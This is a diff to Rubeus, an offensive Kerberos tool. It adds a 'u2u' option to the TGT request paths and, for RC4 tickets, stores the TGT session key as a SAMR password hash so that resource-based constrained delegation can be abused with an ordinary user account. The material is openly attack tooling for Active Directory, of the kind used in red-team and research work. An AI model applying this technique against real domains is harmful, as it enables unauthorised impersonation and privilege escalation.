@@ -32,7 +32,7 @@ namespace Rubeus {
 
     public class Ask
     {
-        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool opsec = false, string servicekey = "", bool changepw = false, bool pac = true, string proxyUrl = null)
+        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool opsec = false, string servicekey = "", bool changepw = false, bool u2u = false, bool pac = true, string proxyUrl = null)
         {
             // send request without Pre-Auth to emulate genuine traffic
             bool preauth = false;
@@ -49,7 +49,7 @@ namespace Rubeus {
                     Console.WriteLine("[*] Using {0} hash: {1}", etype, keyString);               
                     Console.WriteLine("[*] Building AS-REQ (w/ preauth) for: '{0}\\{1}'", domain, userName);
                     AS_REQ userHashASREQ = AS_REQ.NewASReq(userName, domain, keyString, etype, opsec, changepw, pac);
-                    return InnerTGT(userHashASREQ, etype, outfile, ptt, domainController, luid, describe, true, opsec, servicekey, false, proxyUrl);
+                    return InnerTGT(userHashASREQ, etype, outfile, ptt, domainController, luid, describe, true, opsec, servicekey, u2u, false, proxyUrl);
                 }
             }
             catch (KerberosErrorException ex)
@@ -168,7 +168,7 @@ namespace Rubeus {
             }
         }
 
-        public static byte[] TGT(string userName, string domain, string certFile, string certPass, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verifyCerts = false, string servicekey = "", bool getCredentials = false, string proxyUrl = null) {
+        public static byte[] TGT(string userName, string domain, string certFile, string certPass, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verifyCerts = false, string servicekey = "", bool u2u = false, bool getCredentials = false, string proxyUrl = null) {
             try {
                 X509Certificate2 cert = FindCertificate(certFile, certPass);
 
@@ -189,7 +189,7 @@ namespace Rubeus {
                 Console.WriteLine("[*] Building AS-REQ (w/ PKINIT preauth) for: '{0}\\{1}'", domain, userName);
 
                 AS_REQ pkinitASREQ = AS_REQ.NewASReq(userName, domain, cert, agreement, etype, verifyCerts);
-                return InnerTGT(pkinitASREQ, etype, outfile, ptt, domainController, luid, describe, true, false, servicekey, getCredentials, proxyUrl);
+                return InnerTGT(pkinitASREQ, etype, outfile, ptt, domainController, luid, describe, true, false, servicekey, u2u, getCredentials, proxyUrl);
 
             } catch (KerberosErrorException ex) {
                 KRB_ERROR error = ex.krbError;
@@ -230,7 +230,7 @@ namespace Rubeus {
             }
         }
 
-        public static byte[] InnerTGT(AS_REQ asReq, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verbose = false, bool opsec = false, string serviceKey = "", bool getCredentials = false, string proxyUrl = null)
+        public static byte[] InnerTGT(AS_REQ asReq, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verbose = false, bool opsec = false, string serviceKey = "", bool u2u = false, bool getCredentials = false, string proxyUrl = null)
         {
             if ((ulong)luid != 0) {
                 Console.WriteLine("[*] Target LUID : {0}", (ulong)luid);
@@ -283,7 +283,7 @@ namespace Rubeus {
                     Console.WriteLine("[+] TGT request successful!");
                 }
 
-                byte[] kirbiBytes = HandleASREP(responseAsn, etype, asReq.keyString, outfile, ptt, luid, describe, verbose, asReq, serviceKey, getCredentials, dcIP);
+                byte[] kirbiBytes = HandleASREP(responseAsn, etype, asReq.keyString, outfile, ptt, luid, describe, verbose, asReq, serviceKey, u2u, getCredentials, dcIP);
 
                 return kirbiBytes;
             }
@@ -599,7 +599,7 @@ namespace Rubeus {
             return null;
         }
 
-        private static byte[] HandleASREP(AsnElt responseAsn, Interop.KERB_ETYPE etype, string keyString, string outfile, bool ptt, LUID luid = new LUID(), bool describe = false, bool verbose = false, AS_REQ asReq = null, string serviceKey = "", bool getCredentials = false, string dcIP = "")
+        private static byte[] HandleASREP(AsnElt responseAsn, Interop.KERB_ETYPE etype, string keyString, string outfile, bool ptt, LUID luid = new LUID(), bool describe = false, bool verbose = false, AS_REQ asReq = null, string serviceKey = "", bool u2u = false, bool getCredentials = false, string dcIP = "")
         {
             // parse the response to an AS-REP
             AS_REP rep = new AS_REP(responseAsn);
@@ -752,6 +752,13 @@ namespace Rubeus {
                         Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", outfile);
                     }
                 }
+            }
+
+            if (u2u && etype == Interop.KERB_ETYPE.rc4_hmac)
+            {
+                // populate TGT session key in case it's an S4U chain with a UPN target
+                // reference: https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html
+                Samr.NewHashBytes = encRepPart.key.keyvalue;
             }
 
             if (ptt || ((ulong)luid != 0))
